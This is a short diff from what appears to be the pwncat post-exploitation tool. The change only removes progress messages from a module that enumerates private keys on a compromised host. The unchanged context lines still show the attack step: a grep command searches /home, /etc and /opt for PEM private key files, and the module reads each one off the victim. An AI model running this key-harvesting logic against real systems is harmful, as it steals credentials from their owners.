@@ -50,8 +50,6 @@ def enumerate() -> Generator[PrivateKeyFact, None, None]:
 
     data = []
 
-    util.progress("enumerating private keys")
-
     # Search for private keys in common locations
     with pwncat.victim.subprocess(
         "grep -l -I -D skip -rE '^-+BEGIN .* PRIVATE KEY-+$' /home /etc /opt 2>/dev/null | xargs stat -c '%u %n' 2>/dev/null"
@@ -59,14 +57,10 @@ def enumerate() -> Generator[PrivateKeyFact, None, None]:
         for line in pipe:
             line = line.strip().decode("utf-8").split(" ")
             uid, path = int(line[0]), " ".join(line[1:])
-            util.progress(f"enumerating private keys: {Fore.CYAN}{path}{Fore.RESET}")
             data.append(PrivateKeyFact(uid, path, None, False))
 
     for fact in data:
         try:
-            util.progress(
-                f"enumerating private keys: downloading {Fore.CYAN}{fact.path}{Fore.RESET}"
-            )
             with pwncat.victim.open(fact.path, "r") as filp:
                 fact.content = filp.read().strip().replace("\r\n", "\n")
 
